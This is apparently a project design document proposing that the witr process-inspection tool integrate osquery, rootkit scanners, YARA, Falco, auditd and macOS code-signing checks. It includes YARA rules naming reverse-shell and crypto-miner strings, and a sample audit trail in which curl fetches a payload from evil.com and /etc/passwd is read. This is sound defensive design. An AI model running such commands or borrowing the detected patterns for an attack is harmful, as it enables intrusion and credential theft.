# Security & Forensic Enhancements for witr

This document proposes security and forensic tool integrations to enhance witr's process analysis capabilities.

## Executive Summary

witr currently collects process information using native OS commands (`ps`, `lsof`, `/proc`). By integrating security-focused tools, we can provide deeper insights into:

- **Hidden process detection** - Find processes hidden by rootkits
- **Memory analysis** - Detect in-memory malware and injected code
- **Behavioral anomalies** - Identify suspicious syscall patterns
- **Binary integrity** - Verify process binaries haven't been tampered
- **Network forensics** - Enhanced connection analysis
- **Rootkit indicators** - Detect kernel-level tampering

---

## Tool Categories & Recommendations

### 1. Endpoint Query Engine: osquery

**What it is**: SQL-powered operating system instrumentation framework by Facebook/Meta.

**Platform**: Linux, macOS, Windows

**Why integrate**: Provides a unified, SQL-based interface to query 200+ system tables covering processes, network, files, users, and more.

**Key Tables for Process Analysis**:

```sql
-- Process information
SELECT pid, name, path, cmdline, cwd, root, uid, gid,
       resident_size, total_size, start_time, parent
FROM processes WHERE pid = ?;

-- Process open files
SELECT pid, fd, path FROM process_open_files WHERE pid = ?;

-- Process memory map
SELECT pid, start, end, permissions, offset, device, inode, path
FROM process_memory_map WHERE pid = ?;

-- Process environment variables
SELECT pid, key, value FROM process_envs WHERE pid = ?;

-- Listening ports with process info
SELECT p.pid, p.name, l.port, l.address, l.protocol
FROM listening_ports l JOIN processes p ON l.pid = p.pid;

-- Process open sockets
SELECT pid, fd, socket, local_address, remote_address, state
FROM process_open_sockets WHERE pid = ?;

-- Kernel modules (for rootkit detection)
SELECT name, size, used_count, status, address FROM kernel_modules;

-- File hashes for binary verification
SELECT path, sha256 FROM hash WHERE path = ?;
```

**Integration approach**:
```go
// internal/osquery/client.go
type OsqueryClient struct {
    socketPath string
}

func (c *OsqueryClient) QueryProcess(pid int) (*OsqueryProcessInfo, error) {
    // Execute: osqueryi --json "SELECT * FROM processes WHERE pid = ?"
}
```

**Installation**: `brew install osquery` (macOS) / `apt install osquery` (Linux)

---

### 2. Rootkit Detection: unhide + chkrootkit + rkhunter

**What they do**:
- **unhide**: Detects hidden processes by comparing multiple enumeration methods
- **chkrootkit**: Scans for known rootkit signatures in binaries
- **rkhunter**: Comprehensive rootkit scanner with integrity checks

**Platform**: Linux (primarily), some macOS support

**Key capabilities**:

| Tool | Detection Method |
|------|------------------|
| unhide | Brute-force PID enumeration vs /proc |
| unhide | Compare ps output vs /proc filesystem |
| unhide | Compare syscall results vs kernel data |
| chkrootkit | Binary signature matching |
| chkrootkit | Anomaly detection in system commands |
| rkhunter | File hash verification |
| rkhunter | Suspicious file/permission detection |

**Integration approach**:
```go
// internal/security/rootkit.go
type RootkitCheck struct {
    Hidden       bool     // Process appears hidden
    Discrepancy  string   // What doesn't match
    RootkitMatch string   // Known rootkit signature match
    Confidence   float64
}

func CheckForHiddenProcess(pid int) (*RootkitCheck, error) {
    // Run: unhide-linux quick
    // Parse output for hidden PIDs
}

func ScanBinaryIntegrity(binaryPath string) (*IntegrityCheck, error) {
    // Compare hash against known-good database
}
```

**Sample output enhancement**:
```
Warnings    :
  • [SECURITY] Process not visible via /proc but exists in kernel - possible rootkit
  • [SECURITY] Binary /usr/bin/ssh has been modified since installation
```

---

### 3. YARA Rules: Process Memory Scanning

**What it is**: Pattern-matching tool for malware detection via signatures.

**Platform**: Linux, macOS, Windows

**Why integrate**: Scan process memory for known malware patterns, IOCs, and suspicious code.

**Integration approach**:
```go
// internal/yara/scanner.go
type YaraResult struct {
    RuleMatches []string  // Matched rule names
    Severity    string    // critical/high/medium/low
    Details     string    // What was matched
}

func ScanProcessMemory(pid int, rulesPath string) (*YaraResult, error) {
    // Run: yara -p <rules> <pid>
    // Or use yara-go bindings for in-process scanning
}
```

**Sample YARA rules for process scanning**:
```yara
rule Suspicious_Shell_Spawn {
    meta:
        description = "Detects suspicious shell spawning patterns"
    strings:
        $s1 = "/bin/sh -c"
        $s2 = "/bin/bash -i"
        $s3 = "python -c 'import socket"
    condition:
        any of them
}

rule Crypto_Miner_Strings {
    meta:
        description = "Cryptocurrency miner indicators"
    strings:
        $s1 = "stratum+tcp://"
        $s2 = "xmrig"
        $s3 = "cryptonight"
    condition:
        any of them
}
```

**Sample output enhancement**:
```
Security    :
  YARA Matches:
    • [HIGH] Crypto_Miner_Strings - Found mining pool connection string
    • [MEDIUM] Suspicious_Shell_Spawn - Reverse shell pattern detected
```

---

### 4. eBPF/Falco: Runtime Behavior Analysis

**What it is**: Cloud-native runtime security using eBPF for kernel-level visibility.

**Platform**: Linux (eBPF), container environments

**Why integrate**: Real-time syscall monitoring, behavioral anomaly detection.

**Key Falco rules relevant to process analysis**:
```yaml
# Detect processes spawning shells
- rule: Terminal shell in container
  condition: spawned_process and container and shell_procs

# Detect suspicious network connections
- rule: Outbound connection to C2
  condition: outbound and fd.sip in (known_c2_ips)

# Detect privilege escalation
- rule: Sudo to root
  condition: spawned_process and proc.name = sudo and proc.args contains "-i"
```

**Integration approach**:
```go
// internal/falco/client.go
type FalcoAlert struct {
    Rule       string
    Priority   string  // EMERGENCY, ALERT, CRITICAL, ERROR, WARNING, NOTICE, INFO
    Output     string
    Time       time.Time
}

func GetAlertsForPID(pid int, duration time.Duration) ([]FalcoAlert, error) {
    // Query Falco gRPC API for recent alerts matching PID
}
```

**Sample output enhancement**:
```
Runtime Alerts (Falco):
  • [CRITICAL] 2 min ago: Shell spawned in container (rule: terminal_shell_in_container)
  • [WARNING] 5 min ago: Outbound connection to suspicious IP (rule: outbound_c2_connection)
```

---

### 5. Linux Audit Framework (auditd)

**What it is**: Kernel-level syscall auditing for security monitoring.

**Platform**: Linux

**Why integrate**: Query historical syscall activity for the process.

**Key audit rules for process monitoring**:
```bash
# Monitor process execution
-a always,exit -F arch=b64 -S execve -k process_exec

# Monitor file access by PID
-a always,exit -F arch=b64 -S open,openat -F pid=1234 -k file_access

# Monitor network connections
-a always,exit -F arch=b64 -S connect -k network_connect

# Monitor privilege changes
-a always,exit -F arch=b64 -S setuid,setgid -k privilege_change
```

**Integration approach**:
```go
// internal/audit/query.go
type AuditEvent struct {
    Timestamp time.Time
    Type      string   // SYSCALL, PATH, EXECVE, etc.
    Syscall   string
    Success   bool
    Pid       int
    Uid       int
    Exe       string
    Key       string
}

func GetAuditEventsForPID(pid int, since time.Time) ([]AuditEvent, error) {
    // Run: ausearch -p <pid> --start <time> --format json
}
```

**Sample output enhancement**:
```
Audit Trail (last 1h):
  • 14:32:05 - execve("/usr/bin/curl", ["curl", "http://evil.com/payload"])
  • 14:32:06 - connect(185.234.xx.xx:443) [ESTABLISHED]
  • 14:32:07 - open("/etc/passwd", O_RDONLY)
```

---

### 6. macOS Endpoint Security Framework (ESF)

**What it is**: Apple's native API for security event monitoring.

**Platform**: macOS 10.15+

**Why integrate**: Native, low-overhead access to security events.

**Key event types**:
- `ES_EVENT_TYPE_NOTIFY_EXEC` - Process execution
- `ES_EVENT_TYPE_NOTIFY_FORK` - Process forking
- `ES_EVENT_TYPE_NOTIFY_OPEN` - File opens
- `ES_EVENT_TYPE_NOTIFY_MMAP` - Memory mapping
- `ES_EVENT_TYPE_NOTIFY_SIGNAL` - Signal delivery
- `ES_EVENT_TYPE_NOTIFY_KEXTLOAD` - Kernel extension loading

**Integration via eslogger**:
```bash
# Stream exec events for analysis
eslogger exec fork open --format json
```

**Integration approach**:
```go
// internal/esf/monitor.go (macOS only)
type ESFEvent struct {
    EventType   string
    Timestamp   time.Time
    ProcessPath string
    Pid         int
    Ppid        int
    Uid         int
    SigningID   string
    TeamID      string
    CDHash      string
}

func GetRecentEventsForPID(pid int) ([]ESFEvent, error) {
    // Parse eslogger output or use CGO bindings
}
```

**Sample output enhancement**:
```
macOS Security Events:
  Code Signing: Valid (Apple)
  Team ID: ABCDEF1234
  Entitlements: com.apple.security.app-sandbox

  Recent Activity:
    • EXEC /usr/bin/curl (signed: Apple)
    • OPEN /etc/hosts (read-only)
    • CONNECT 93.184.216.34:443
```

---

### 7. Binary Integrity & Code Signing

**What it is**: Verify process binary hasn't been tampered with.

**Platform**: Both (different approaches)

**macOS approach**:
```bash
# Check code signature
codesign -dv --verbose=4 /path/to/binary

# Verify against notarization
spctl -a -vv /path/to/binary
```

**Linux approach**:
```bash
# Compare against package manager
rpm -Vf /path/to/binary  # RHEL
dpkg -V package_name      # Debian

# Hash comparison
sha256sum /path/to/binary
```

**Integration approach**:
```go
// internal/integrity/check.go
type BinaryIntegrity struct {
    Path            string
    SHA256          string
    SignatureValid  bool     // macOS code signing
    SignedBy        string   // Certificate subject
    PackageVerified bool     // Linux: matches installed package
    ModifiedSince   *time.Time
}

func VerifyBinary(path string) (*BinaryIntegrity, error) {
    // Platform-specific verification
}
```

**Sample output enhancement**:
```
Binary Integrity:
  Path     : /usr/bin/python3
  SHA256   : a1b2c3d4...
  Signed   : Yes (Apple Software)
  Verified : Yes (matches installed package)
  Modified : No
```

---

## Proposed New Data Model Extensions

```go
// pkg/model/security.go
type SecurityContext struct {
    // Rootkit detection
    HiddenProcess   bool
    RootkitIndicators []string

    // Binary integrity
    BinaryIntegrity *BinaryIntegrity

    // YARA matches
    YaraMatches     []YaraMatch

    // Behavioral analysis
    SuspiciousSyscalls []SyscallAnomaly

    // Runtime alerts
    FalcoAlerts     []FalcoAlert

    // Audit trail
    RecentAuditEvents []AuditEvent

    // Code signing (macOS)
    CodeSignature   *CodeSignature

    // osquery enrichment
    OsqueryData     *OsqueryEnrichment
}

type BinaryIntegrity struct {
    Path           string
    SHA256         string
    SignatureValid bool
    SignedBy       string
    Notarized      bool
    PackageMatch   bool
    TamperedWith   bool
}

type YaraMatch struct {
    RuleName    string
    Severity    string
    Description string
    MatchOffset int64
}

type SyscallAnomaly struct {
    Syscall     string
    Count       int
    Anomaly     string  // "high_frequency", "unusual_args", etc.
}

type CodeSignature struct {
    Valid       bool
    TeamID      string
    SigningID   string
    Entitlements []string
}
```

---

## Implementation Phases

### Phase 1: osquery Integration (High Value, Low Effort)
- Add osquery as optional dependency
- Query process tables for enriched data
- Fallback to native commands if osquery unavailable

### Phase 2: Binary Integrity Checks
- Hash verification against package managers
- macOS code signature validation
- File modification timestamp checks

### Phase 3: Rootkit Detection
- Integrate unhide for hidden process detection
- Add chkrootkit/rkhunter scanning
- Cross-reference multiple enumeration methods

### Phase 4: YARA Memory Scanning
- Bundle common malware YARA rules
- Scan process memory on demand
- Support custom rule paths

### Phase 5: Audit/ESF Integration
- Linux: Query auditd for syscall history
- macOS: Parse eslogger output
- Show recent security-relevant events

### Phase 6: Runtime Security (Advanced)
- Optional Falco integration
- Real-time behavioral alerts
- Container-aware analysis

---

## New CLI Flags

```
witr --pid 1234 --security          # Enable all security checks
witr --pid 1234 --yara ./rules/     # Scan with custom YARA rules
witr --pid 1234 --audit             # Include audit trail
witr --pid 1234 --integrity         # Verify binary integrity
witr --pid 1234 --rootkit           # Run rootkit detection
witr --pid 1234 --osquery           # Use osquery for enrichment
```

---

## Dependencies to Add

| Tool | Package | Platform | Optional |
|------|---------|----------|----------|
| osquery | `osquery` | Both | Yes |
| yara | `yara` | Both | Yes |
| unhide | `unhide` | Linux | Yes |
| chkrootkit | `chkrootkit` | Linux | Yes |
| rkhunter | `rkhunter` | Linux | Yes |
| auditd | `audit` | Linux | Yes |
| eslogger | Built-in | macOS 13+ | N/A |

---

## Sample Enhanced Output

```
$ witr --pid 1234 --security

Target      : suspicious_process

Process     : suspicious (pid 1234) [healthy]
User        : www-data
Command     : /tmp/.hidden/miner --pool stratum://...
Started     : 2 hours ago

Why It Exists :
  systemd (pid 1) → cron (pid 456) → sh (pid 789) → suspicious (pid 1234)

Source      : cron (Confidence: 0.6)

Security Analysis:
  Binary Integrity:
    Path       : /tmp/.hidden/miner
    SHA256     : 7a8b9c...
    Signed     : No
    Package    : Not from any installed package
    ⚠ SUSPICIOUS: Binary in /tmp with execution permissions

  YARA Matches:
    • [CRITICAL] XMRig_Miner - Cryptocurrency miner detected
    • [HIGH] Packed_Binary - UPX packing detected

  Rootkit Check:
    • Process visible via all enumeration methods
    • No rootkit indicators detected

  Audit Trail (last 1h):
    • 12:30:15 - execve("/tmp/.hidden/miner", [...])
    • 12:30:16 - connect(185.234.xx.xx:3333) [mining pool]
    • 12:30:16 - setrlimit(RLIMIT_NOFILE, 65535)

Warnings    :
  • Process is running from suspicious directory: /tmp/.hidden
  • Binary not signed or from package manager
  • YARA detected cryptocurrency miner
  • Outbound connection to known mining pool
  • Process spawned by cron - check crontab for unauthorized entries
```

---

## References

- [osquery Documentation](https://osquery.io/docs)
- [Volatility Framework](https://volatilityfoundation.org/)
- [Falco Project](https://falco.org/)
- [YARA Documentation](https://virustotal.github.io/yara/)
- [Linux Audit Documentation](https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/7/html/security_guide/chap-system_auditing)
- [Apple Endpoint Security](https://developer.apple.com/documentation/endpointsecurity)
- [unhide](http://www.yourkit.com/docs/ci_10/api/unhide-tcp.html)
- [chkrootkit](http://www.chkrootkit.org/)
- [rkhunter](http://rkhunter.sourceforge.net/)
